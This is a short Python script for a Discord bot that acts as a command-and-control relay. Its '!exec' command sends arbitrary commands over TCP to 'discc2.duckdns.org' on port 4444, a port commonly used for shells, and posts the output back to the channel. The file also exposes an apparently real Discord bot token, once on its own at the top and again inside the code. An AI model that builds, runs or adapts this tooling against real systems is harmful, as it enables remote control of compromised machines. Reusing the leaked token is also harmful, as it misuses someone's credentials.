MTI5ODkxMTI4MjU4OTg1OTg2MA.GzJ2c_.uU_ivVwWH6OnDj_LMYmQf8XzcbmweqY_8WbKt0

discc2.duckdns.org



import discord
from discord.ext import commands
import socket

# Replace with your bot token
BOT_TOKEN = 'MTI5ODkxMTI4MjU4OTg1OTg2MA.GzJ2c_.uU_ivVwWH6OnDj_LMYmQf8XzcbmweqY_8WbKt0'

# Replace with your public IP address or DDNS hostname and port
TARGET_IP = 'discc2.duckdns.org'
TARGET_PORT = 4444

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

def send_command(command):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((TARGET_IP, TARGET_PORT))
        s.sendall(command.encode())
        response = s.recv(1024)
        return response.decode()

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')

@bot.command()
async def exec(ctx, command: str):
    response = send_command(command)
    await ctx.send(f'Output: {response}')

bot.run(BOT_TOKEN)